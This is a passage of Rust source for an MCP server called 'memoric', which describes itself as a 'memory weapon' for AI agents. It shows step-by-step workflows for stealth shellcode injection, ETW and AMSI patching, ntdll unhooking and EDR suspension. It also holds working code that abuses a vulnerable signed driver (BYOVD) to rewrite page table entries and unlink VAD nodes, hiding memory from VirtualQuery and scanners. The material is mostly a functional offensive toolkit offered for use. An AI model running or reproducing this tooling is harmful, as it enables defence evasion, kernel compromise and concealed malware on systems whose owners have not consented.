                "templates": "Pre-built attack templates (stealth_inject, privilege_escalation, persistence, recon, memory_forensics)",
                "status": "Full system status: admin, UAC, EDR, driver, PID"
            },
            "workflow": "assess → detects EDR/AV/kernel protections → generates evasion plan → execute runs full chain → plan validates custom chains"
        })),
        Some("all") | None => Ok(json!({
            "memoric": "Memory weapon MCP server - CONSOLIDATED EDITION",
            "tools": {
                "memoric": "Guide & workflow assistant",
                "target": "Process/thread/module operations",
                "memory": "Memory R/W/scan/management",
                "inject": "Code injection (17+ methods)",
                "payload": "PE parsing, obfuscation, lifecycle",
                "hook": "Function hooking (IAT/inline/HWBP)",
                "stealth": "Defense evasion & self-protection",
                "detect": "EDR/VM/forensics detection",
                "privilege": "Privilege escalation & tokens",
                "kernel": "Kernel memory & BYOVD operations",
                "self": "Self introspection & testing",
                "orchestrate": "Auto attack chain orchestration"
            },
            "quick_start": [
                "1. memoric(status=true) → check session",
                "2. privilege(action='check') → see privileges",
                "3. privilege(action='debug_priv') → enable access",
                "4. target(action='ps_find', name='target') → find process",
                "5. memory(action='read', pid=X, address=Y, size=32) → read memory",
                "6. inject(action='shellcode', pid=X, method='thread', shellcode=[...]) → inject"
            ],
            "tip": "Prefer explicit actions like threads_list, write_string, query_find, and hook_function. All tools use an 'action' parameter; use memoric(domain='X') for accurate action lists."
        })),
        _ => Err(format!("Unknown domain: {}. Use: target, memory, inject, payload, hook, stealth, detect, privilege, kernel, self, orchestrate, all", domain.unwrap_or("?"))),
    }
}

fn suggest_workflow(goal: &str) -> Result<Value, String> {
    let goal_lower = goal.to_lowercase();

    if goal_lower.contains("inject") && goal_lower.contains("stealth") {
        Ok(json!({
            "goal": goal,
            "workflow": [
                "1. privilege(action='check') → verify privileges",
                "2. privilege(action='debug_priv') → SeDebugPrivilege",
                "3. detect(action='edr_quick_check') → assess EDR",
                "4. stealth(action='patch_etw') + stealth(action='patch_amsi') → blind monitoring",
                "5. stealth(action='unhook_ntdll') → remove hooks",
                "6. target(action='ps_find', name='target') → find process",
                "7. inject(action='shellcode', pid=X, method='mockingjay') → zero-alloc injection",
                "8. stealth(action='sleep_ekko', delay_ms=5000) → encrypt memory"
            ]
        }))
    } else if goal_lower.contains("inject") {
        Ok(json!({
            "goal": goal,
            "workflow": [
                "1. privilege(action='debug_priv')",
                "2. target(action='ps_find', name='target')",
                "3. inject(action='shellcode', pid=X, shellcode=[...], method='thread')"
            ]
        }))
    } else if goal_lower.contains("hook") {
        Ok(json!({
            "goal": goal,
            "workflow": [
                "1. target(action='modules', pid=X) → find module",
                "2. payload(action='pe_parse', pid=X, module='Y', show='imports') → find function",
                "3. hook(action='install_iat', pid=X, module='Y', function='Z', hook_address=A)"
            ]
        }))
    } else if goal_lower.contains("scan") || goal_lower.contains("find") {
        Ok(json!({
            "goal": goal,
            "workflow": [
                "1. memory(action='scan_new', pid=X, value_type='u32', value=Y) → initial session scan",
                "2. memory(action='scan_next', session_id='scan_N', filter='changed') → narrow after value changes",
                "3. memory(action='read', pid=X, address=Y, size=16) → inspect candidate"
            ],
            "alternative_modes": [
                "scan_mode='range' + min/max + scan_type='int' → value range search",
                "scan_mode='string' + pattern='text' → ANSI/Unicode string search",
                "scan_mode='aligned' + value=Y + alignment=8 → struct-aligned scan (fast)",
                "scan_mode='multi' + values=[80,90,100] → multi-value scan",
                "scan_mode='delta' + delta=N + direction='increased_by' → find values changed by N",
                "scan_mode='pointer' + target_address=X → pointer chain discovery"
            ]
        }))
    } else if goal_lower.contains("kernel") || goal_lower.contains("driver") {
        Ok(json!({
            "goal": goal,
            "workflow": [
                "1. privilege(action='check') → must be admin",
                "2. kernel(action='driver_discover') → find BYOVD",
                "3. kernel(action='driver_auto') → load driver",
                "4. kernel(action='physical_read', address=X, size=Y) → physical memory"
            ]
        }))
    } else {
        Ok(json!({
            "goal": goal,
            "suggestion": "Call memoric(domain='X') for tool help",
            "domains": ["target", "memory", "inject", "payload", "hook", "stealth", "detect", "privilege", "kernel", "self"]
        }))
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// PTE/VAD Modification via BYOVD Driver
// ═════════════════════════════════════════════════════════════════════════════

/// Modify Page Table Entry via BYOVD driver — change page protection at the hardware level.
/// This is invisible to VirtualQuery and memory scanners that only check VAD/software protection.
///
/// Requires: loaded BYOVD driver, target virtual address, and the CR3 of the target process.
fn pte_modify_via_driver(args: &Value) -> Result<Value, String> {
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, OPEN_EXISTING,
    };
    use windows::Win32::System::IO::DeviceIoControl;

    let device_path = args
        .get("device_path")
        .and_then(|v| v.as_str())
        .ok_or("pte_modify requires device_path (e.g. '\\\\.\\RTCore64')")?;
    let read_ioctl = args
        .get("read_ioctl")
        .and_then(|v| v.as_u64())
        .ok_or("pte_modify requires read_ioctl")? as u32;
    let write_ioctl = args
        .get("write_ioctl")
        .and_then(|v| v.as_u64())
        .ok_or("pte_modify requires write_ioctl")? as u32;
    let virtual_addr = args
        .get("address")
        .and_then(|v| v.as_u64())
        .ok_or("pte_modify requires address (virtual address to modify)")?;
    let cr3 = args
        .get("cr3")
        .and_then(|v| v.as_u64())
        .ok_or("pte_modify requires cr3 (page table base of target process)")?;
    let make_writable = args.get("writable").and_then(|v| v.as_bool());
    let make_executable = args.get("executable").and_then(|v| v.as_bool());

    tracing::warn!(
        "[KERNEL] PTE modify: VA 0x{:016X} CR3 0x{:016X}",
        virtual_addr,
        cr3
    );

    unsafe {
        // Open BYOVD device
        let dev_w: Vec<u16> = device_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let handle = CreateFileW(
            windows::core::PCWSTR(dev_w.as_ptr()),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| format!("Open device: {}", e))?;

        // Helper: read 8 bytes from physical address via driver
        let phys_read8 = |addr: u64| -> Result<u64, String> {
            let input = addr.to_le_bytes();
            let mut output = [0u8; 8];
            let mut br = 0u32;
            DeviceIoControl(
                handle,
                read_ioctl,
                Some(input.as_ptr() as *const _),
                8,
                Some(output.as_mut_ptr() as *mut _),
                8,
                Some(&mut br),
                None,
            )
            .map_err(|e| format!("Phys read 0x{:016X}: {}", addr, e))?;
            Ok(u64::from_le_bytes(output))
        };

        // Helper: write 8 bytes to physical address
        let phys_write8 = |addr: u64, value: u64| -> Result<(), String> {
            let mut input = addr.to_le_bytes().to_vec();
            input.extend_from_slice(&value.to_le_bytes());
            let mut br = 0u32;
            DeviceIoControl(
                handle,
                write_ioctl,
                Some(input.as_ptr() as *const _),
                input.len() as u32,
                None,
                0,
                Some(&mut br),
                None,
            )
            .map_err(|e| format!("Phys write 0x{:016X}: {}", addr, e))?;
            Ok(())
        };

        // Walk x64 4-level page table: PML4 → PDPT → PD → PT
        let pml4_base = cr3 & 0x000F_FFFF_FFFF_F000;
        let pml4_idx = (virtual_addr >> 39) & 0x1FF;
        let pdpt_idx = (virtual_addr >> 30) & 0x1FF;
        let pd_idx = (virtual_addr >> 21) & 0x1FF;
        let pt_idx = (virtual_addr >> 12) & 0x1FF;

        // PML4E
        let pml4e_addr = pml4_base + pml4_idx * 8;
        let pml4e = phys_read8(pml4e_addr)?;
        if pml4e & 1 == 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err(format!("PML4E not present at index {}", pml4_idx));
        }

        // PDPTE
        let pdpt_base = pml4e & 0x000F_FFFF_FFFF_F000;
        let pdpte_addr = pdpt_base + pdpt_idx * 8;
        let pdpte = phys_read8(pdpte_addr)?;
        if pdpte & 1 == 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err("PDPTE not present".to_string());
        }
        // Check for 1GB page (PS bit)
        if pdpte & (1 << 7) != 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err("1GB large page — PTE modification not applicable".to_string());
        }

        // PDE
        let pd_base = pdpte & 0x000F_FFFF_FFFF_F000;
        let pde_addr = pd_base + pd_idx * 8;
        let pde = phys_read8(pde_addr)?;
        if pde & 1 == 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err("PDE not present".to_string());
        }
        // Check for 2MB page
        if pde & (1 << 7) != 0 {
            // Large page — modify PDE directly
            let mut new_pde = pde;
            if let Some(w) = make_writable {
                if w {
                    new_pde |= 1 << 1;
                } else {
                    new_pde &= !(1 << 1);
                }
            }
            if let Some(x) = make_executable {
                if x {
                    new_pde &= !(1u64 << 63);
                } else {
                    new_pde |= 1u64 << 63;
                }
            }
            phys_write8(pde_addr, new_pde)?;
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Ok(json!({
                "success": true,
                "technique": "pte_modify",
                "page_type": "2MB_large",
                "virtual_address": format!("0x{:016X}", virtual_addr),
                "pde_address": format!("0x{:016X}", pde_addr),
                "original_pde": format!("0x{:016X}", pde),
                "new_pde": format!("0x{:016X}", new_pde),
                "message": "2MB large page PDE modified"
            }));
        }

        // PTE (4KB page)
        let pt_base = pde & 0x000F_FFFF_FFFF_F000;
        let pte_addr = pt_base + pt_idx * 8;
        let pte = phys_read8(pte_addr)?;
        if pte & 1 == 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err("PTE not present".to_string());
        }

        let mut new_pte = pte;
        if let Some(w) = make_writable {
            if w {
                new_pte |= 1 << 1;
            } else {
                new_pte &= !(1 << 1);
            }
        }
        if let Some(x) = make_executable {
            if x {
                new_pte &= !(1u64 << 63);
            } else {
                new_pte |= 1u64 << 63;
            }
        }

        phys_write8(pte_addr, new_pte)?;

        let _ = windows::Win32::Foundation::CloseHandle(handle);

        Ok(json!({
            "success": true,
            "technique": "pte_modify",
            "page_type": "4KB",
            "virtual_address": format!("0x{:016X}", virtual_addr),
            "pte_physical_address": format!("0x{:016X}", pte_addr),
            "original_pte": format!("0x{:016X}", pte),
            "new_pte": format!("0x{:016X}", new_pte),
            "page_walk": {
                "pml4e": format!("0x{:016X}", pml4e),
                "pdpte": format!("0x{:016X}", pdpte),
                "pde": format!("0x{:016X}", pde),
                "pte": format!("0x{:016X}", pte)
            },
            "flags": {
                "present": new_pte & 1 != 0,
                "writable": new_pte & (1 << 1) != 0,
                "user": new_pte & (1 << 2) != 0,
                "executable": new_pte & (1u64 << 63) == 0
            },
            "message": format!("PTE modified at physical 0x{:016X}. Protection change invisible to VirtualQuery.", pte_addr)
        }))
    }
}

/// Hide memory region by manipulating VAD (Virtual Address Descriptor) tree via BYOVD.
///
/// Walks EPROCESS→VadRoot red-black tree, finds the VAD node covering the target address,
/// and unlinks it. The memory remains accessible but invisible to VirtualQuery, memory scanners,
/// and Process Explorer.
fn vad_hide_via_driver(args: &Value) -> Result<Value, String> {
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, OPEN_EXISTING,
    };
    use windows::Win32::System::IO::DeviceIoControl;

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or("vad_hide requires pid")? as u32;
    let target_addr = args
        .get("address")
        .and_then(|v| v.as_u64())
        .ok_or("vad_hide requires address (virtual address in target region)")?;
    let device_path = args
        .get("device_path")
        .and_then(|v| v.as_str())
        .ok_or("vad_hide requires device_path")?;
    let read_ioctl = args
        .get("read_ioctl")
        .and_then(|v| v.as_u64())
        .ok_or("vad_hide requires read_ioctl")? as u32;
    let write_ioctl = args
        .get("write_ioctl")
        .and_then(|v| v.as_u64())
        .ok_or("vad_hide requires write_ioctl")? as u32;

    // MMVAD offsets — Win10 20H2+ / Win11
    let vad_root_offset = args
        .get("vad_root_offset")
        .and_then(|v| v.as_u64())
        .unwrap_or(0x7D8) as u64;
    // MMVAD_SHORT structure offsets
    let starting_vpn_offset = args
        .get("starting_vpn_offset")
        .and_then(|v| v.as_u64())
        .unwrap_or(0x18) as u64;
    let ending_vpn_offset = args
        .get("ending_vpn_offset")
        .and_then(|v| v.as_u64())
        .unwrap_or(0x20) as u64;
    let left_child_offset = 0u64; // VadNode.Left is at offset 0 in RTL_BALANCED_NODE
    let right_child_offset = 8u64; // VadNode.Right at offset 8

    let target_vpn = target_addr >> 12; // Virtual Page Number

    tracing::warn!(
        "[KERNEL] VAD hide: PID {} address 0x{:016X} (VPN 0x{:X})",
        pid,
        target_addr,
        target_vpn
    );

    unsafe {
        // Find EPROCESS
        let eprocess = crate::kernel::find_eprocess_for_pid(pid).map_err(|e| e.to_string())?;
        if eprocess == 0 {
            return Err(format!("EPROCESS not found for PID {}", pid));
        }

        // Open BYOVD device
        let dev_w: Vec<u16> = device_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let handle = CreateFileW(
            windows::core::PCWSTR(dev_w.as_ptr()),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| format!("Open device: {}", e))?;

        let kern_read8 = |addr: u64| -> Result<u64, String> {
            let input = addr.to_le_bytes();
            let mut output = [0u8; 8];
            let mut br = 0u32;
            DeviceIoControl(
                handle,
                read_ioctl,
                Some(input.as_ptr() as *const _),
                8,
                Some(output.as_mut_ptr() as *mut _),
                8,
                Some(&mut br),
                None,
            )
            .map_err(|e| format!("Kern read 0x{:016X}: {}", addr, e))?;
            Ok(u64::from_le_bytes(output))
        };

        let kern_read4 = |addr: u64| -> Result<u32, String> {
            let input = addr.to_le_bytes();
            let mut output = [0u8; 4];
            let mut br = 0u32;
            DeviceIoControl(
                handle,
                read_ioctl,
                Some(input.as_ptr() as *const _),
                8,
                Some(output.as_mut_ptr() as *mut _),
                4,
                Some(&mut br),
                None,
            )
            .map_err(|e| format!("Kern read4 0x{:016X}: {}", addr, e))?;
            Ok(u32::from_le_bytes(output))
        };

        let kern_write8 = |addr: u64, value: u64| -> Result<(), String> {
            let mut input = addr.to_le_bytes().to_vec();
            input.extend_from_slice(&value.to_le_bytes());
            let mut br = 0u32;
            DeviceIoControl(
                handle,
                write_ioctl,
                Some(input.as_ptr() as *const _),
                input.len() as u32,
                None,
                0,
                Some(&mut br),
                None,
            )
            .map_err(|e| format!("Kern write 0x{:016X}: {}", addr, e))?;
            Ok(())
        };

        // Read VadRoot (RTL_AVL_TREE at EPROCESS+VadRootOffset)
        // RTL_AVL_TREE.Root is at offset 0
        let vad_root_ptr = eprocess as u64 + vad_root_offset;
        let root_node = kern_read8(vad_root_ptr)?;

        if root_node == 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err("VadRoot is empty".to_string());
        }

        // Walk the AVL tree to find the VAD covering our target VPN
        let mut current = root_node;
        let mut found_vad = 0u64;
        let mut depth = 0u32;
        let max_depth = 64;

        while current != 0 && depth < max_depth {
            depth += 1;

            let start_vpn = kern_read4(current + starting_vpn_offset)? as u64;
            let end_vpn = kern_read4(current + ending_vpn_offset)? as u64;

            if target_vpn >= start_vpn && target_vpn <= end_vpn {
                found_vad = current;
                break;
            }

            if target_vpn < start_vpn {
                current = kern_read8(current + left_child_offset)?;
            } else {
                current = kern_read8(current + right_child_offset)?;
            }
        }

        if found_vad == 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err(format!(
                "No VAD found covering VPN 0x{:X} (depth {})",
                target_vpn, depth
            ));
        }

        let start_vpn = kern_read4(found_vad + starting_vpn_offset)? as u64;
        let end_vpn = kern_read4(found_vad + ending_vpn_offset)? as u64;

        // To unlink from AVL tree: read Left, Right, ParentValue
        let left = kern_read8(found_vad + left_child_offset)?;
        let right = kern_read8(found_vad + right_child_offset)?;

        // RTL_BALANCED_NODE.ParentValue is at offset 16, low 2 bits are balance/flags
        let parent_value = kern_read8(found_vad + 16)?;
        let parent_node = parent_value & !3u64;

        // Simple unlink: if node is a leaf (no children), just null the parent's pointer to us
        if left == 0 && right == 0 && parent_node != 0 {
            // Check which child we are
            let parent_left = kern_read8(parent_node + left_child_offset)?;
            if parent_left == found_vad {
                kern_write8(parent_node + left_child_offset, 0)?;
            } else {
                kern_write8(parent_node + right_child_offset, 0)?;
            }
        } else if left == 0 && right != 0 && parent_node != 0 {
            // Single right child: replace us with our right child
            let parent_left = kern_read8(parent_node + left_child_offset)?;
            if parent_left == found_vad {
                kern_write8(parent_node + left_child_offset, right)?;
            } else {
                kern_write8(parent_node + right_child_offset, right)?;
            }
            // Update child's parent pointer
            let child_parent = kern_read8(right + 16)?;
            let new_parent = (parent_node) | (child_parent & 3);
            kern_write8(right + 16, new_parent)?;
        } else if left != 0 && right == 0 && parent_node != 0 {
            // Single left child: replace us with our left child
            let parent_left = kern_read8(parent_node + left_child_offset)?;
            if parent_left == found_vad {
                kern_write8(parent_node + left_child_offset, left)?;
            } else {
                kern_write8(parent_node + right_child_offset, left)?;
            }
            let child_parent = kern_read8(left + 16)?;
            let new_parent = (parent_node) | (child_parent & 3);
            kern_write8(left + 16, new_parent)?;
        } else {
            // Two children or root node — complex rebalancing needed
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Ok(json!({
                "success": false,
                "technique": "vad_hide",
                "pid": pid,
                "eprocess": format!("0x{:016X}", eprocess),
                "vad_node": format!("0x{:016X}", found_vad),
                "start_vpn": format!("0x{:X}", start_vpn),
                "end_vpn": format!("0x{:X}", end_vpn),
                "region": format!("0x{:016X} - 0x{:016X}", start_vpn << 12, (end_vpn + 1) << 12),
                "left_child": format!("0x{:016X}", left),
                "right_child": format!("0x{:016X}", right),
                "message": "VAD node has two children — AVL tree rebalancing required. Use kernel(action='write') to manually patch the tree, or hide a different allocation."
            }));
        }

        let _ = windows::Win32::Foundation::CloseHandle(handle);

        Ok(json!({
            "success": true,
            "technique": "vad_hide",
            "pid": pid,
            "eprocess": format!("0x{:016X}", eprocess),
            "vad_node": format!("0x{:016X}", found_vad),
            "start_vpn": format!("0x{:X}", start_vpn),
            "end_vpn": format!("0x{:X}", end_vpn),
            "hidden_region": format!("0x{:016X} - 0x{:016X}", start_vpn << 12, (end_vpn + 1) << 12),
            "hidden_size": format!("0x{:X}", ((end_vpn - start_vpn + 1) << 12)),
            "tree_depth": depth,
            "message": format!("VAD node unlinked. Region 0x{:016X}-0x{:016X} is now invisible to VirtualQuery/memory scanners.", start_vpn << 12, (end_vpn + 1) << 12)
        }))
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// Legacy Conversion Helpers (for backwards compatibility)
// ═════════════════════════════════════════════════════════════════════════════

fn convert_legacy_target(name: &str, args: Value) -> Value {
    let mut new_args = args.clone();
    new_args.as_object_mut().map(|m| {
        let action = match name {
            "ps" => match args
                .get("action")
                .and_then(|v| v.as_str())
                .unwrap_or("list")
            {
                "list" | "ps_list" => "ps_list",
                "find" | "search" | "ps_find" => "ps_find",
                "info" | "get" | "ps_info" => "ps_info",
                _ => "ps_list",
            },
            "modules" => "modules",
            "threads" => {
                if args.get("tid").is_some() {
                    "thread_context"
                } else {
                    "threads_list"
                }
            }
            "suspend_thread" => "thread_suspend",
            "resume_thread" => "thread_resume",
            _ => "ps_list",
        };
        m.insert("action".to_string(), json!(action));
    });
    new_args
}

fn convert_legacy_memory(name: &str, args: Value) -> Value {
    let mut new_args = args.clone();
    new_args.as_object_mut().map(|m| {
        let action = match name {
            "regions" => "query",
            _ => name,
        };
        m.insert("action".to_string(), json!(action));
    });
    new_args
}

fn convert_legacy_stealth(name: &str, args: Value) -> Value {
    let action = match name {
        "patch" => args
            .get("target")
            .and_then(|v| v.as_str())
            .map(|t| format!("patch_{}", t)),
        "syscall" => args
            .get("op")
            .and_then(|v| v.as_str())
            .map(|o| format!("syscall_{}", o)),
        "cloak" => args
            .get("action")
            .and_then(|v| v.as_str())
            .map(|a| a.to_string()),
        "edr" => args
            .get("action")
            .and_then(|v| v.as_str())
            .map(|a| format!("edr_{}", a)),
        "vm_detect" => Some("vm_sandbox".to_string()),
        _ => None,
    };
    let mut new_args = args.clone();
    if let Some(a) = action {
        new_args.as_object_mut().map(|m| {
            m.insert("action".to_string(), a.into());
        });
    }
    new_args
}

fn convert_legacy_detect(name: &str, args: Value) -> Value {
    let mut new_args = args.clone();
    new_args.as_object_mut().map(|m| {
        let action = match name {
            "edr" => match args
                .get("action")
                .and_then(|v| v.as_str())
                .unwrap_or("products")
            {
                "products" | "list" => "edr_products",
                "hooks" => "edr_hooks",
                "quick" | "quick_check" => "edr_quick_check",
                "suspend" => "edr_suspend",
                _ => "edr_products",
            },
            "vm_detect" => "vm_sandbox",
            "anti_forensics" => "forensics",
            _ => "edr_products",
        };
        m.insert("action".to_string(), json!(action));
    });
    new_args
}

fn convert_legacy_self_protect(args: Value) -> Value {
    let mut new_args = args.clone();
    new_args.as_object_mut().map(|m| {
        let action = match args
            .get("action")
            .and_then(|v| v.as_str())
            .unwrap_or("init")
        {
            "init" => "protect_init",
            "encrypt" => "protect_encrypt",
            "decrypt" => "protect_decrypt",
            "wipe" | "clear" => "protect_wipe",
            _ => "protect_init",
        };
        m.insert("action".to_string(), json!(action));
    });
    new_args
}

fn convert_legacy_privilege(name: &str, args: Value) -> Value {
    let action = match name {
        "elevate" => "elevate",
        "token" => args
            .get("action")
            .and_then(|v| v.as_str())
            .unwrap_or("token_steal"),
        "debug_priv" => "debug_priv",
        "check_admin" => "check",
        _ => "check",
    };
    let mut new_args = args.clone();
    new_args.as_object_mut().map(|m| {
        m.insert("action".to_string(), action.to_string().into());
    });
    new_args
}

fn convert_legacy_kernel(name: &str, args: Value) -> Value {
    let action = match name {
        "driver" => args
            .get("action")
            .and_then(|v| v.as_str())
            .map(|a| format!("driver_{}", a)),
        "kernel_read" => Some("read".to_string()),
        "kernel_write" => Some("write".to_string()),
        "kernel_op" => args
            .get("op")
            .and_then(|v| v.as_str())
            .map(|o| o.to_string()),
        "bruteforce" => args
            .get("action")
            .and_then(|v| v.as_str())
            .map(|a| a.to_string()),
        "sniff" => args
            .get("action")
            .and_then(|v| v.as_str())
            .map(|a| format!("sniff_{}", a)),
        "anti_forensics" => args
            .get("action")
            .and_then(|v| v.as_str())
            .map(|a| a.to_string()),
        "self_protect" => args
            .get("action")
            .and_then(|v| v.as_str())
            .map(|a| format!("protect_{}", a)),
        _ => None,
    };
    let mut new_args = args.clone();
    if let Some(a) = action {
        new_args.as_object_mut().map(|m| {
            m.insert("action".to_string(), a.into());
        });
    }
    new_args
}

fn convert_legacy_self(name: &str, args: Value) -> Value {
    let action = match name {
        "peb" => "peb",
        "heap" => "heap",
        "self_test" => "test",
        "status" => "info",
        _ => "test",
    };
    let mut new_args = args.clone();
    new_args.as_object_mut().map(|m| {
        m.insert("action".to_string(), json!(action));
    });
    new_args
}

/// Convert deprecated top-level tools to their modern equivalents
fn convert_legacy_error_tools(name: &str, args: Value) -> (String, Value) {
    match name {
        "inject_dll" => {
            let dll_method = args
                .get("method")
                .and_then(|v| v.as_str())
                .unwrap_or("classic");
            let dll_path = args.get("path").and_then(|v| v.as_str()).unwrap_or("");
            (
                "inject".to_string(),
                json!({
                    "action": "dll",
                    "dll_path": dll_path,
                    "dll_method": dll_method,
                    "pid": args.get("pid").unwrap_or(&json!(0)),
                }),
            )
        }
        "spawn" => {
            let spawn_method = args
                .get("spawn_method")
                .and_then(|v| v.as_str())
                .unwrap_or("hollow");
            (
                "inject".to_string(),
                json!({
                    "action": "spawn",
                    "spawn_method": spawn_method,
                    "target_exe": args.get("target_exe").unwrap_or(&json!("")),
                    "payload": args.get("payload").unwrap_or(&json!("")),
                }),
            )
        }
        "hijack" => (
            "inject".to_string(),
            json!({
                "action": "hijack_enum",
                "pid": args.get("pid").unwrap_or(&json!(0)),
            }),
        ),
        "pe_parse" => (
            "payload".to_string(),
            json!({
                "action": "pe_parse",
                "pid": args.get("pid").unwrap_or(&json!(0)),
                "module": args.get("module").unwrap_or(&json!("")),
            }),
        ),
        "obfuscate" => (
            "payload".to_string(),
            json!({
                "action": "obfuscate",
                "obf_method": args.get("method").unwrap_or(&json!("xor")),
            }),
        ),
        "inject_ctl" => (
            "payload".to_string(),
            json!({
                "action": args.get("action").and_then(|v| v.as_str()).unwrap_or("cleanup"),
                "pid": args.get("pid").unwrap_or(&json!(0)),
            }),
        ),
        "unhook" => (
            "stealth".to_string(),
            json!({
                "action": "unhook_ntdll",
            }),
        ),
        _ => unreachable!(),
    }
}
